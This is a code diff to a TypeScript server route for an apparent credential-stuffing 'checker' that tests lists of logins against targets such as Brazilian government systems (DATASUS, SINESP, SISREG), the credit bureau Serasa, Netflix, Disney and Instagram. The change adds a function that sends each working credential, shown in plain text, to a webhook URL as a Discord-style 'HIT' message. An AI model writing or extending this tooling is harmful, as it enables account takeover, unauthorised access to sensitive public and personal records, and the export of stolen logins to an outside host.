@@ -2269,10 +2269,29 @@ router.post("/checker/check", async (req, res): Promise<void> => {
 //   { type:"start",  total }
 //   { type:"result", ...CheckResult, index, total, hits, fails, errors, retries, wasRetried }
 //   { type:"done",   total, hits, fails, errors, retries, elapsedMs, credsPerMin }
+async function fireHitWebhook(webhookUrl: string, credential: string, detail: string | undefined, targetLabel: string): Promise<void> {
+  try {
+    const embed = {
+      title:       "✅ HIT ENCONTRADO",
+      description: `**Credencial:** \`${credential}\`\n**Alvo:** ${targetLabel}${detail ? `\n**Detalhe:** ${detail}` : ""}`,
+      color:       0x2ecc71,
+      timestamp:   new Date().toISOString(),
+      footer:      { text: "Lelouch Britannia Checker" },
+    };
+    await fetch(webhookUrl, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify({ username: "Lelouch Checker", embeds: [embed] }),
+      signal:  AbortSignal.timeout(8_000),
+    });
+  } catch { /* ignore webhook errors — don't break the stream */ }
+}
+
 router.post("/checker/stream", async (req, res): Promise<void> => {
-  const { credentials, target = "iseek" } = req.body as {
+  const { credentials, target = "iseek", webhookUrl } = req.body as {
     credentials?: string[];
     target?:      CheckerTarget;
+    webhookUrl?:  string;
   };
 
   const validTargets: CheckerTarget[] = ["iseek", "datasus", "sipni", "consultcenter", "mind7", "serpro", "sisreg", "credilink", "serasa", "crunchyroll", "netflix", "amazon", "hbomax", "disney", "paramount", "sinesp", "serasa_exp", "instagram", "sispes", "sigma"];
@@ -2365,6 +2384,10 @@ router.post("/checker/stream", async (req, res): Promise<void> => {
       else                                errors++;
       if (result.wasRetried) retries++;
       send({ type: "result", ...result, index, total, hits, fails, errors, retries });
+      if (result.status === "HIT" && webhookUrl?.startsWith("https://")) {
+        const targetLabel = target.charAt(0).toUpperCase() + target.slice(1);
+        void fireHitWebhook(webhookUrl, result.credential, result.detail, targetLabel);
+      }
     },
   );
 
